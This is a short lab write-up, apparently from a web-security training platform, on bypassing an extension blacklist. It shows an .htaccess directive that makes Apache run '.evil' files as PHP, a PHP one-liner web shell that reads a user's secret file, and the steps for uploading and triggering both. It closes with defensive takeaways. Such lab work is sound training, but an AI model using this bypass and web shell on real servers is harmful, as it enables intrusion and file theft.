# Lab: Web shell upload via extension blacklist bypass

## Description
This lab uses an extension blacklist to block `.php` files. We can bypass this by uploading a `.htaccess` file that reconfigures the server to execute a different extension as PHP.

## Analysis
The application blocks `.php` files but allows other extensions. We can upload a `.htaccess` file (if the server is Apache) to change the server's configuration.

```text
AddType application/x-httpd-php .evil
```

This tells Apache to treat files with the `.evil` extension as PHP scripts.

## Exploitation
I need to upload a `.htaccess` file and then a PHP shell with a different extension.

### Steps
1. Create a file named `.htaccess` with the following content:
   `AddType application/x-httpd-php .evil`
2. Upload `.htaccess`. The application accepts it.
3. Create a PHP shell: `<?php echo file_get_contents('/home/carlos/secret'); ?>`. Save it as `shell.evil`.
4. Upload `shell.evil`. The application accepts it because `.evil` is not in the blacklist.
5. Access the shell: `/avatars/shell.evil`. Apache will execute it as PHP.

## Payload
```text
.htaccess content: AddType application/x-httpd-php .evil
```

## Takeaways
- Blacklists are inherently weak. Always use a strict whitelist of allowed extensions.
- Prevent users from uploading configuration files like `.htaccess`, `web.config`, etc.
- Disable `AllowOverride` in Apache to prevent `.htaccess` files from changing the directory configuration.
